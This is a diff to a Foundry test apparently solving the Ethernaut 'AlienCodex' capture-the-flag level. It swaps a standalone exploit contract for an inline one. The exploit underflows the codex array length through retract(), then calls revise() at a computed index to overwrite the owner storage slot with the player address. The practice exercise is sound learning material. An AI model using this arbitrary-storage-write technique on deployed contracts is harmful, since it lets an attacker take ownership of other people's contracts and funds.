@@ -13,16 +13,7 @@ interface AlienCodex {
     function record(bytes32) external;
     function retract() external;
     function revise(uint256, bytes32) external;
-}
-
-contract AlienCodexExploit {
-    function exploit(address instanceAddress) public {
-        AlienCodex instance = AlienCodex(instanceAddress);
-        instance.makeContact();
-        instance.retract();
-        uint256 codexZeroIndex = uint256(keccak256(abi.encode(1)));
-        instance.revise(type(uint256).max - codexZeroIndex + 1, bytes32(uint256(uint160(tx.origin))));
-    }
+    function owner() external view returns (address);
 }
 
 contract TestAlienCodex is Test, Utils {
@@ -31,7 +22,6 @@ contract TestAlienCodex is Test, Utils {
 
     address payable owner;
     address payable player;
-
 
     /*//////////////////////////////////////////////////////////////
                                  HELPERS
@@ -75,6 +65,19 @@ contract TestAlienCodex is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
+        console.logBytes32(bytes32(uint256(uint160(instance.owner()))));
+        instance.makeContact();
+        instance.retract();
+        bytes32 slot0 = vm.load(address(instance), bytes32(0));
+        console.logBytes32(slot0);
 
+        bytes32 arrayPosition = keccak256(abi.encode(uint256(1)));
+        console.logBytes32(arrayPosition);
+
+        instance.revise(type(uint256).max - uint256(arrayPosition) + 1, bytes32(uint256(uint160(address(player)))));
+
+
+        bytes32 slot0After = vm.load(address(instance), bytes32(0));
+        console.logBytes32(slot0After);
     }
 }
